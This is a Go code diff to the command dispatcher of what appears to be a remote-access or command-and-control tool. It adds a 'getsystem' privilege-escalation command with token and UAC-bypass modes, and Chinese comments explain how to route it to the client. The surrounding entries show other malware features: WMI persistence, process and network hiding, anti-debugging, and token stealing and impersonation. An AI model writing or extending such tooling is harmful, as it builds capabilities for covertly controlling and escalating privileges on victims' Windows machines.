@@ -85,6 +85,10 @@ var commandTable = []cmdSpec{
 	{prefix: "wmi_persist ", typ: command1.WMI_PERSIST, build: rawArg},
 	{prefix: "hideprocess ", typ: command1.HIDE_PROCESS, build: rawArg},
 	{prefix: "hidenet ", typ: command1.HIDE_NET, build: rawArg},
+	// 提权（阶段三）：getsystem [auto|token|uac|uac_cleanup]
+	// 注意必须在这里显式登记：漏了会落到下面的"默认 SHELL"分支，把 getsystem
+	// 当 shell 命令发给 cmd.exe，客户端的 GETSYSTEM 分支永远收不到（实测踩过）。
+	{prefix: "getsystem ", typ: command1.GETSYSTEM, build: rawArg},
 	// Token 操作链（A8）
 	{prefix: "make_token ", typ: command1.MAKE_TOKEN, build: rawArg},
 	{prefix: "steal_token ", typ: command1.STEAL_TOKEN, build: rawArg},
@@ -117,6 +121,8 @@ var exactCommands = map[string]uint32{
 	"antidebug":                   command1.ANTIDEBUG,
 	"hideprocess":                 command1.HIDE_PROCESS,
 	"hidenet":                     command1.HIDE_NET,
+	// 提权（阶段三）：不带参数时客户端默认 auto
+	"getsystem": command1.GETSYSTEM,
 	// Token 操作链（A8）：make_token/steal_token 带参数走前缀表
 	"rev2self": command1.REV2SELF,
 }
